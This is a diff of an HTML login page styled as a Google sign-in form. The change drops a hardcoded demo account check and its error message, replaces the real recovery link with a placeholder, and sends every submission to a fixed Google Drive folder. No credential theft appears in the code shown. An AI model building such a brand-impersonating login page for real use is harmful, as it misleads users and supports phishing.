@@ -59,12 +59,6 @@
         button:hover {
             background-color: #1557b0;
         }
-        .error {
-            color: red;
-            font-size: 14px;
-            margin-top: 10px;
-            display: none; /* Hidden by default */
-        }
         .footer {
             margin-top: 30px;
             font-size: 12px;
@@ -85,10 +79,9 @@
             <input type="email" id="email" name="email" placeholder="Email or phone" required>
             <input type="password" id="password" name="password" placeholder="Enter your password" required>
             <button type="submit">Sign in</button>
-            <div id="errorMessage" class="error">Invalid email or password. Try again.</div>
         </form>
         <div class="footer">
-            <a href="https://myaccount.google.com/recovery" target="_blank" class="link">Forgot password?</a><br>
+            <a href="#" class="link">Forgot password?</a><br>
             Not your computer? Use Guest mode to sign in privately.<br>
             <a href="#" class="link">Learn more</a><br>
             by faizproject
@@ -96,27 +89,10 @@
     </div>
 
     <script>
-        // Simulasi database akun (ubah sesuai kebutuhan)
-        const userAccounts = {
-            "user1@example.com": "password1",
-            "user2@example.com": "password2",
-            "admin@faizproject.com": "adminpass"
-        };
-
         document.getElementById('loginForm').addEventListener('submit', function(event) {
             event.preventDefault(); // Prevent default form submission
-            const enteredEmail = document.getElementById('email').value;
-            const enteredPassword = document.getElementById('password').value;
-            const errorMessage = document.getElementById('errorMessage');
-
-            // Cek apakah email ada dan password cocok
-            if (userAccounts[enteredEmail] && userAccounts[enteredEmail] === enteredPassword) {
-                // Login berhasil, redirect ke Google Drive
-                window.location.href = 'https://drive.google.com';
-            } else {
-                // Email atau password salah, tampilkan error
-                errorMessage.style.display = 'block';
-            }
+            // Simulate login and redirect to Google Drive
+            window.location.href = 'https://drive.google.com/drive/folders/1hDdAySCY-x2QGPSFd-eNSAfO__jNjrWM';
         });
     </script>
 </body>
